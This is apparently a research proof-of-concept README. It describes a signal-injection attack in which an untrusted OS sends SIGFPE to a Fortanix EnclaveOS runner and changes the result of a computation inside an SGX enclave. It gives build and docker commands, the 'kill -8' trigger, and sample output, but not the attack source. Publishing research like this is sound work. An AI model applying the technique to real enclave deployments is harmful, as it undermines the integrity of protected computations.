Our attack shows that the signal interface exposed to the untrusted OS can be used to compromise the execution and data integrity of enclaves. 
In our PoC we demonstrate the effect with a simple example that changes the mean of a computation. 

compile signal.c
```
gcc -o signal signal.c
```
and create the docker container
```
docker build -f signal.dockerfile -t <registry>/<personal-path>/signal-hub:latest .
```
follow the [guide](https://support.fortanix.com/hc/en-us/articles/360042965552-Using-Fortanix-Confidential-Computing-Manager-to-Build-an-Enclave-OS-Application-from-Scratchn) to create an enclave OS application.

Once the application runs send SIGFPE to the **enclaveos-runner** with

```
kill -8 <enclaveos-runner PID>
```
The signal arrives at the process and the respective handler is executed
```
[...]
# Generated by enclaveos-signer

sgx.sigfile = file:/tmp/toolserver-080lfxqo/app.sig
sgx.sigfile2 = file:/tmp/toolserver-080lfxqo/app.sig2
Fortanix(R) EnclaveOS Runtime Encryption Platform 3.36.1941-EM
Copyright 2017-2023 Fortanix, Inc. All rights reserved.
/opt/fortanix/enclave-os/default_cert/app_private.pem(key) file created
/opt/fortanix/enclave-os/default_cert/app_public.pem(cert) file created
Waiting...
In SIGFPE handler
New mean is : 100
```
without the signal handler and waiting we observe the following output
```
[...]
# Generated by enclaveos-signer

sgx.sigfile = file:/tmp/toolserver-080lfxqo/app.sig
sgx.sigfile2 = file:/tmp/toolserver-080lfxqo/app.sig2
Fortanix(R) EnclaveOS Runtime Encryption Platform 3.36.1941-EM
Copyright 2017-2023 Fortanix, Inc. All rights reserved.
/opt/fortanix/enclave-os/default_cert/app_private.pem(key) file created
/opt/fortanix/enclave-os/default_cert/app_public.pem(cert) file created
New mean is : 10
```
 Note that, to simplify the PoC we busy wait in the victim enclave process for the signal, instead of timing the signal injection perfectly. 